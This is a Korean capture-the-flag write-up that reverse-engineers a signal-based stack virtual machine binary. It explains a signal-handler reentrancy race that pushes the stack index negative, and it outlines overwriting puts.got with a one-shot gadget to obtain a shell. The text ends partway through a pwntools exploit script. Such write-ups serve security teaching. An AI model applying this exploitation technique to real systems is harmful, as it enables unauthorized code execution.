<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ppid; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *code; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> *<span class="title">context</span>;</span> <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setup();</span><br><span class="line">  loading();</span><br><span class="line">  code = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x301</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;opcodes &gt;&quot;</span>);</span><br><span class="line">  len = read(<span class="number">0</span>, code, <span class="number">0x300</span>uLL);</span><br><span class="line">  context = (<span class="keyword">struct</span> context *)mmap(<span class="number">0LL</span>, <span class="number">8uLL</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);<span class="comment">// mmap(0, 8, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0)</span></span><br><span class="line">  <span class="keyword">if</span> ( !fork() )                                <span class="comment">// child process</span></span><br><span class="line">  &#123;</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    alarm(<span class="number">8u</span>);</span><br><span class="line">    ppid = getppid();</span><br><span class="line">    run(ppid, code, len, context);</span><br><span class="line">  &#125;</span><br><span class="line">  alarm(<span class="number">8u</span>);</span><br><span class="line">  set_signal_handlers(context);                 <span class="comment">// parent process</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>context</code> 구조체는 가상머신의 상태를 나타내는 구조체입니다. 명령어의 실행 상태를 나타내는 열거형 변수 <code>state</code> 와 인자를 전달받고 결과를 대입하는 용도로 사용하는 정수형 변수 <code>reg</code> 를 멤버로 가지고 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">state</span> <span class="title">state</span>;</span></span><br><span class="line">  u32 reg;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>열거형 <code>state</code> 는 다음과 같이 명령어가 실행 중임을 나타내는 <code>LOCKED</code> , 명령어 실행에 성공했음을 나타내는 <code>SUCCESS</code> , 실행 중 오류가 발생했음을 나타내는 <code>ERROR</code> 로 구분됩니다. <code>state</code> 의 사용은 이후 분석할 함수들에서 자세히 살펴볼 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">state</span> :</span> <span class="type">unsigned</span> __int32</span><br><span class="line">&#123;</span><br><span class="line">  LOCKED = <span class="number">0x1</span>,</span><br><span class="line">  SUCCESS = <span class="number">0x2</span>,</span><br><span class="line">  ERROR = <span class="number">0x3</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>부모 프로세스에서 호출하는 <code>set_signal_handlers</code> 함수는 전역 변수 <code>g_context</code> 에 앞서 할당한 <code>context</code> 구조체를 대입합니다. 이후 각각의 시그널 번호에 해당하는 핸들러 함수를 등록하고 무한 루프에 진입합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">set_signal_handlers</span><span class="params">(<span class="keyword">struct</span> context *context)</span> <span class="comment">// 0x1766</span></span><br><span class="line">&#123;</span><br><span class="line">  g_context = context;</span><br><span class="line">  signal(<span class="number">1</span>, (<span class="type">__sighandler_t</span>)push_handler);</span><br><span class="line">  signal(<span class="number">2</span>, (<span class="type">__sighandler_t</span>)pop_handler);</span><br><span class="line">  signal(<span class="number">3</span>, (<span class="type">__sighandler_t</span>)clean_handler);</span><br><span class="line">  signal(<span class="number">4</span>, (<span class="type">__sighandler_t</span>)log_handler);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>자식 프로세스에서 호출하는 <code>run</code> 함수는 <code>setup_seccomp</code> 함수를 호출하고 <code>send_locked</code> 함수를 통해 <code>CLEAN</code> 명령어를 실행한 후, 입력받은 opcode를 파싱하여 각각의 명령어를 실행합니다. 파싱한 opcode에 해당하는 명령어가 없으면 <code>send</code> 함수를 통해 부모 프로세스에 <code>SIGKILL</code> 시그널을 전송하여 종료합니다. 주석 처리하여 생략한 “opcode handlers” 부분이 가상머신이 명령어를 처리하는 부분으로, 이 부분은 가상머신의 전체 구조를 먼저 살펴본 후 분석하겠습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">run</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> ppid, <span class="type">char</span> *code, <span class="type">unsigned</span> <span class="type">int</span> len, <span class="keyword">struct</span> context *context)</span>  <span class="comment">// 0xe2d</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  setup_seccomp(<span class="number">62</span>, <span class="number">0xC000003E</span>, <span class="number">1u</span>);</span><br><span class="line">  send_locked(ppid, context, CLEAN, <span class="number">0</span>);</span><br><span class="line">  pc = <span class="number">0</span>;</span><br><span class="line">  eflags = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( pc &lt; len )</span><br><span class="line">  &#123;</span><br><span class="line">    op = pc++;</span><br><span class="line">    <span class="keyword">switch</span> ( code[op] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* ... opcode handlers ... */</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        send(ppid, context, (<span class="keyword">enum</span> signal)<span class="number">9u</span>, <span class="number">0</span>);<span class="comment">// SIGKILL</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  send(ppid, context, (<span class="keyword">enum</span> signal)<span class="number">9u</span>, <span class="number">0</span>);      <span class="comment">// SIGKILL</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>setup_seccomp</code> 함수는 <code>prctl</code> 시스템 콜을 호출하여 다른 시스템 콜을 필터링하도록 하는데, seccomp-tools 도구를 사용하면 바이너리에 설정된 필터링 정책을 쉽게 분석할 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">setup_seccomp</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">unsigned</span> __int16 a3)</span>  <span class="comment">// 0xc70</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v3) )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(PR_SET_SECCOMP)&quot;</span>);            <span class="comment">// prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER))</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><div class="link-preview-widget"><a href="https://github.com/david942j/seccomp-tools" rel="noopener" target="_blank"><div class="link-preview-widget-title">GitHub - david942j/seccomp-tools: Provide powerful tools for seccomp analysis</div><div class="link-preview-widget-description">Provide powerful tools for seccomp analysis. Contribute to david942j/seccomp-tools development by creating an account on GitHub.</div><div class="link-preview-widget-url">GitHub</div></a><a class="link-preview-widget-image" href="https://github.com/david942j/seccomp-tools" rel="noopener" style="background-image: url('https://opengraph.githubassets.com/07c0d3784cdfc42fa23577c7b0cd792d0e3a50373568565ded588adc6f533df0/david942j/seccomp-tools');" target="_blank"></a></div></p>
<p>다음과 같이 seccomp-tools 를 실행한 결과, <code>kill</code> 시스템 콜이 아니면 모두 필터링함을 알 수 있습니다. 따라서 자식 프로세스를 <code>execve</code> 등의 시스템 콜을 사용하여 익스플로잇하는 것은 불가능하며, 부모 프로세스를 익스플로잇하여 셸을 획득해야 함을 추측할 수 있습니다.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ seccomp-tools dump ./isolated</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x03 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0005</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x0000003e  <span class="keyword">if</span> (A != <span class="built_in">kill</span>) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000001  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><code>run</code> 함수는 명령어 실행 및 <code>SIGKILL</code> 시그널 전송 등에 <code>send_locked</code> 와 <code>send</code> 두 가지 함수를 동시에 사용하고 있습니다. 먼저 <code>send</code> 함수를 살펴보면 <code>context-&gt;state</code> 를 <code>LOCKED</code> 로 설정하고, 인자 <code>arg</code> 를 <code>context-&gt;reg</code> 에 대입한 후 <code>kill</code> 시스템 콜을 호출하여 부모 프로세스에 시그널을 전송합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">send</span><span class="params">(<span class="type">__pid_t</span> ppid, <span class="keyword">struct</span> context *context, <span class="keyword">enum</span> signal signum, <span class="type">int</span> arg)</span>  <span class="comment">// 0xda4</span></span><br><span class="line">&#123;</span><br><span class="line">  context-&gt;state = LOCKED;</span><br><span class="line">  context-&gt;reg = arg;</span><br><span class="line">  kill(ppid, signum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>이 때 <code>signum</code> 에 해당하는 시그널 번호는 다음과 같이 <code>signal</code> 열거형 중 하나 또는 9 (<code>SIGKILL</code>)로, <code>PUSH</code> , <code>POP</code> , <code>CLEAN</code> , <code>LOG</code> 가 각각의 명령어에 해당합니다. 따라서 바이너리가 묘사하는 가상머신은 자식 프로세스가 명령어와 인자를 시그널로 전송하면, 부모 프로세스에서 해당하는 핸들러 함수를 호출하여 처리하는 구조임을 알 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">signal</span> :</span> <span class="type">unsigned</span> __int32</span><br><span class="line">&#123;</span><br><span class="line">  PUSH = <span class="number">0x1</span>,</span><br><span class="line">  POP = <span class="number">0x2</span>,</span><br><span class="line">  CLEAN = <span class="number">0x3</span>,</span><br><span class="line">  LOG = <span class="number">0x4</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>다음으로 <code>send_blocked</code> 함수는 동일하게 <code>send</code> 함수를 호출하여 시그널을 전송한 이후, <code>context-&gt;state</code> 가 <code>LOCKED</code> 인 동안 루프에 진입하는 busy waiting을 수행합니다. 이후 분석할 부모 프로세스의 핸들러 함수들은 모두 명령어 실행 루틴 이후 <code>context-&gt;state</code> 를 <code>SUCCESS</code> 또는 <code>ERROR</code> 로 설정합니다. <code>send</code> 함수가 <code>context-&gt;state</code> 를 <code>LOCKED</code> 로 설정한 이상 핸들러 함수가 루틴을 종료할 때까지 <code>send_blocked</code> 함수는 무한 대기하므로, 이 함수는 명령어를 일종의 블로킹(blocking) 방식으로 실행하도록 한다고 생각할 수 있겠습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">send_locked</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> ppid, <span class="keyword">struct</span> context *context, <span class="keyword">enum</span> signal signum, <span class="type">unsigned</span> <span class="type">int</span> arg)</span>   <span class="comment">// 0xddf</span></span><br><span class="line">&#123;</span><br><span class="line">  send(ppid, context, signum, arg);</span><br><span class="line">  <span class="keyword">while</span> ( context-&gt;state == LOCKED )            <span class="comment">// busy waiting while being processed</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( context-&gt;state == ERROR )</span><br><span class="line">    context-&gt;reg = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>이번에는 부모 프로세스에서 각각의 명령어를 처리하는 핸들러 함수를 살펴보겠습니다. 모든 핸들러 함수에서 공통적으로 사용하는 전역 변수는 다음과 같습니다.</p>
<ol>
<li><code>stack</code> - 정수형 전역 배열로, 원소 1543개 크기입니다.</li>
<li><code>g_stack_idx</code> - 스택 포인터의 역할을 하는 정수형 전역 변수로, 이 변수의 값을 인덱스로 <code>stack</code> 에 접근합니다.</li>
<li><code>log_enabled</code> - 전역 변수로, 값이 0이 아닌 경우 핸들러 함수가 로그를 출력합니다.</li>
</ol>
<p><code>push_handler</code> 함수는 <code>g_stack_idx</code> 가 767보다 작거나 같은 경우 1을 증가시키고, <code>stack[g_stack_idx]</code> 에 인자로 전달된 <code>g_context-&gt;reg</code> 를 대입합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">push_handler</span><span class="params">()</span> <span class="comment">// 0x15c2</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> stack_idx; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( g_stack_idx &gt; <span class="number">767</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    g_context-&gt;state = ERROR;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( log_enabled )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[*] PUSH stack[0x%x] = 0x%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)g_stack_idx, g_context-&gt;reg);</span><br><span class="line">    stack_idx = g_stack_idx++;</span><br><span class="line">    <span class="built_in">stack</span>[stack_idx] = g_context-&gt;reg;</span><br><span class="line">    g_context-&gt;state = SUCCESS;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>pop_handler</code> 함수는 <code>g_stack_idx</code> 가 0이 아닌 경우 1을 감소시키고, <code>stack[g_stack_idx]</code> 를 <code>g_context-&gt;reg</code> 에 대입합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pop_handler</span><span class="params">()</span>  <span class="comment">// 0x164d</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( g_stack_idx )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( log_enabled )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[*] POP stack[0x%x] == 0x%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(g_stack_idx - <span class="number">1</span>), <span class="built_in">stack</span>[g_stack_idx - <span class="number">1</span>]);</span><br><span class="line">    g_context-&gt;reg = <span class="built_in">stack</span>[--g_stack_idx];</span><br><span class="line">    g_context-&gt;state = SUCCESS;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    g_context-&gt;state = ERROR;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>clean_handler</code> 함수는 <code>g_stack_idx</code> 를 0으로 초기화시킵니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">clean_handler</span><span class="params">()</span>  <span class="comment">// 0x16f7</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( log_enabled )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] CLEAN STACK&quot;</span>);</span><br><span class="line">  <span class="built_in">stack</span>[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  g_stack_idx = <span class="number">0</span>;</span><br><span class="line">  g_context-&gt;state = SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>log_handler</code> 함수는 <code>log_enabled</code> 에 <code>g_context-&gt;reg</code> 를 대입합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">log_handler</span><span class="params">()</span>  <span class="comment">// 0x1736</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[!] I prepared log feature for you :)&quot;</span>);</span><br><span class="line">  log_enabled = g_context-&gt;reg;</span><br><span class="line">  g_context-&gt;state = SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>가상머신의 전체 구조를 훑어보았습니다. 이제 다시 자식 프로세스로 돌아가 <code>run</code> 함수에서 opcode를 파싱하는 코드를 살펴보겠습니다. <code>run</code> 함수는 switch 구문을 반복하면서 파싱을 수행하는데, 각각의 case 블록에서 공통적인 부분은 다음과 같습니다.</p>
<ol>
<li><code>PUSH</code> 를 제외한 인자가 있는 opcode는 인자를 opcode에 포함하여 전달할지, <code> stack</code> 에서 <code>POP</code> 하여 전달할지 플래그 값을 통해 선택할 수 있습니다.
<ul>
<li>플래그 값이 <code>\x66</code> 이면 opcode가 인자를 포함하고 있고, <code>\x55</code> 면 <code>send_locked</code> 함수를 호출하여 <code>POP</code> 명령을 수행한 후 결과를 인자로 전달합니다.</li>
</ul>
</li>
<li><code>ADD</code> , <code>SUB</code> , <code>MUL</code> , <code>DIV</code> , <code>CMP</code> 는 opcode의 구조가 완전히 동일하며, 이 중 <code>CMP</code> 를 제외한 나머지는 <code>send_locked</code> 함수를 호출하여 결과를 <code>stack</code> 에 <code>PUSH</code> 합니다.</li>
</ol>
<p>다음은 opcode를 파싱하는 switch 구문입니다. 각각의 opcode는 첫 바이트가 종류를 나타내며 case에 해당합니다. 나머지 바이트들은 주석에 나타낸 바와 같이 플래그 값과 경우에 따라 인자들로 구성되어 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( code[op] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:                                   <span class="comment">// PUSH [u32 arg1]</span></span><br><span class="line">    push_arg1 = *(_DWORD *)&amp;code[pc];</span><br><span class="line">    pc += <span class="number">4</span>;</span><br><span class="line">    send(ppid, context, PUSH, push_arg1);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:                                   <span class="comment">// POP</span></span><br><span class="line">    send(ppid, context, POP, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:                                   <span class="comment">// ADD [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]</span></span><br><span class="line">                                            <span class="comment">// add two arguments and push</span></span><br><span class="line">    _pc = pc;</span><br><span class="line">    v21 = pc + <span class="number">1</span>;</span><br><span class="line">    add_flag1 = code[_pc];</span><br><span class="line">    <span class="keyword">if</span> ( add_flag1 == <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add_arg1 = *(_DWORD *)&amp;code[v21];</span><br><span class="line">      v21 += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( add_flag1 != <span class="number">0x55</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      send_locked(ppid, context, POP, <span class="number">0</span>);</span><br><span class="line">      add_arg1 = context-&gt;reg;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = v21;</span><br><span class="line">    pc = v21 + <span class="number">1</span>;</span><br><span class="line">    add_flag2 = code[v6];</span><br><span class="line">    <span class="keyword">if</span> ( add_flag2 == <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add_arg2 = *(_DWORD *)&amp;code[pc];</span><br><span class="line">      pc += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( add_flag2 != <span class="number">0x55</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      send_locked(ppid, context, POP, <span class="number">0</span>);</span><br><span class="line">      add_arg2 = context-&gt;reg;</span><br><span class="line">    &#125;</span><br><span class="line">    send_locked(ppid, context, PUSH, add_arg2 + add_arg1);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:                                   <span class="comment">// SUB [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]</span></span><br><span class="line">                                            <span class="comment">// subtract two arguments and push</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:                                   <span class="comment">// MUL [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]</span></span><br><span class="line">                                            <span class="comment">// multiply two arguments and push</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">5</span>:                                   <span class="comment">// DIV [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]</span></span><br><span class="line">                                            <span class="comment">// divide two arguments and push</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">6</span>:                                   <span class="comment">// CMP [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]</span></span><br><span class="line">                                            <span class="comment">// compare two arguments and save result to eflags</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">9</span>:                                   <span class="comment">// CLEAN</span></span><br><span class="line">    send_locked(ppid, context, CLEAN, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">10</span>:                                  <span class="comment">// LOG [u8 arg1] [u32 optional arg2]</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    send(ppid, context, (<span class="keyword">enum</span> signal)<span class="number">9u</span>, <span class="number">0</span>);<span class="comment">// SIGKILL</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">문제 풀이</h2>
<p>자식 프로세스의 시스템 콜 필터링으로 인해 앞서 언급한 바와 같이 부모 프로세스를 익스플로잇해야 합니다. 익스플로잇은 다음과 같은 취약점을 바탕으로 수행합니다.</p>
<ol>
<li><code>g_stack_idx</code> 의 자료형이 <code>int</code> 로, <code>push_handler</code> 와 <code>pop_handler</code> 함수에서 충분하지 않은 경계 검사를 수행하고 있습니다.
<ul>
<li><code>g_stack_idx</code> 의 값을 음수로 만들 수 있다면 두 함수의 경계 검사를 모두 통과하여, <code>stack</code> 보다 낮은 주소의 메모리에 대한 읽기와 쓰기가 가능합니다.</li>
</ul>
</li>
<li><code>PUSH</code> 와 <code>POP</code> opcode는 블로킹 방식의 <code>send_blocked</code> 함수가 아닌 <code>send</code> 함수를 호출하고 있습니다.</li>
</ol>
<p><code>run</code> 함수의 switch 구문을 보면 <code>PUSH</code> 와 <code>POP</code> opcode를 처리하는 case 블록에서 단순히 <code>send</code> 함수를 호출하여 시그널을 전송하도록 하고 있습니다. <code>send</code> 함수는 <code>send_blocked</code> 함수와 달리 부모 프로세스에서 실행 중인 핸들러 함수가 종료할 때까지 기다리는 메커니즘이 존재하지 않아, 연속하여 호출할 경우 의도하지 않은 결과를 일으킬 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( code[op] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:                                   <span class="comment">// PUSH [u32 arg1]</span></span><br><span class="line">    push_arg1 = *(_DWORD *)&amp;code[pc];</span><br><span class="line">    pc += <span class="number">4</span>;</span><br><span class="line">    send(ppid, context, PUSH, push_arg1);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:                                   <span class="comment">// POP</span></span><br><span class="line">    send(ppid, context, POP, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>시그널 핸들러로의 흐름 전환은 유저 모드의 코드를 실행하고 있는 한 언제나 발생할 수 있습니다. 따라서 원칙적으로 핸들러 함수는 재진입성이 보장되어야(reentrant) 하며, 최소한 시그널의 전달 자체만이라도 블로킹 방식으로 이루어져야 합니다. 여기서 재진입성의 보장이란 핸들러 함수를 실행하는 도중 임의 시점에서 시그널을 받아 함수 내부에서 같은 핸들러 함수를 호출하더라도, 기존 핸들러 함수의 실행 결과에 영향을 주지 않아야 함을 의미합니다.</p>
<p>그러나 <code>push_handler</code> 와 <code>pop_handler</code> 함수에서 이루어지는 <code>g_stack_idx</code> 전역 변수에 대한 증감 연산은 원자적이지 않을(non-atomic) 뿐더러, 시그널의 전송 과정도 블로킹 방식을 사용하고 있지 않습니다. 예를 들어 <code>g_stack_idx</code> 의 값이 1이고 두 개의 <code>POP</code> opcode를 파싱하여 시그널을 전송하는 상황을 생각해보겠습니다. 만약 전송이 블로킹 방식으로 이루어졌다면 다음과 같이 <code>pop_handler</code> 의 조건문에 의해 <code>g_stack_idx</code> 의 값은 음수가 될 수 없습니다.</p>
<p><img src="/images/codegate22-isolated/1.png" alt="1.png"></p>
<p>그런데 블로킹 방식이 아닌 상황에서는 <code>pop_handler</code> 의 조건문을 통과한 상태에서 다음과 같이 추가적인 시그널에 인한 재진입이 발생할 수 있습니다. 이 경우 재진입한 핸들러를 포함하여 <code>g_stack_idx</code> 에 대한 증감 연산이 두 번 모두 이루어져 값이 음수가 될 수 있습니다.</p>
<p><img src="/images/codegate22-isolated/2.png" alt="2.png"></p>
<p><code>push_handler</code> 와 <code>pop_handler</code> 는 각각 <code>g_stack_idx</code> 가 767보다 작거나 같은지, 0이 아닌지만 검사합니다. 따라서 일단  <code>g_stack_idx</code> 의 값을 음수로 만들고 나면 연속된 <code>POP</code> opcode 등으로 얼마든지 값을 감소시켜, <code>stack</code> 보다 낮은 주소의 메모리에 대한 자유로운 읽기와 쓰기가 가능해집니다. <code>puts.got</code> 는 <code>stack</code> 보다 낮은 주소에 있고 <code>puts</code> 라이브러리 함수의 주소가 저장되어 있으므로, <code>SUB</code> opcode 등을 이용하여 oneshot 가젯의 주소로 변조하면 셸을 획득할 수 있습니다.</p>
<p>다음은 위의 내용을 바탕으로 작성한 익스플로잇 코드입니다. 37행은 <code>CLEAN</code> , 2번의 <code>PUSH</code> , 3번의 <code>POP</code> 을 반복하여 <code>g_stack_idx</code> 의 값이 음수가 되도록 합니다. 46행은 블로킹 방식의 <code>POP</code> 을 반복하여 <code>puts.got</code> 를 참조할 수 있도록 <code>g_stack_idx</code> 를 감소시키는데, 반복 횟수는 실행 환경에 따라 시행착오를 거쳐야 합니다. 52행은 <code>SUB</code> opcode를 사용해 <code>puts.got</code> 에 oneshot 가젯의 주소를 대입합니다. 익스플로잇 코드를 성공할 때까지 수차례 실행하면 셸을 획득할 수 있습니다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./isolated&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__opcode</span>(<span class="params">op, pop1, pop2, args=[<span class="number">0</span>, <span class="number">0</span>]</span>):</span><br><span class="line">    s = p8(op) + (p8(<span class="number">0x55</span>) <span class="keyword">if</span> pop1 <span class="keyword">else</span> p8(<span class="number">0x66</span>) + p32(args[<span class="number">0</span>]))</span><br><span class="line">    s += (p8(<span class="number">0x55</span>) <span class="keyword">if</span> pop2 <span class="keyword">else</span> p8(<span class="number">0x66</span>) + p32(args[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span 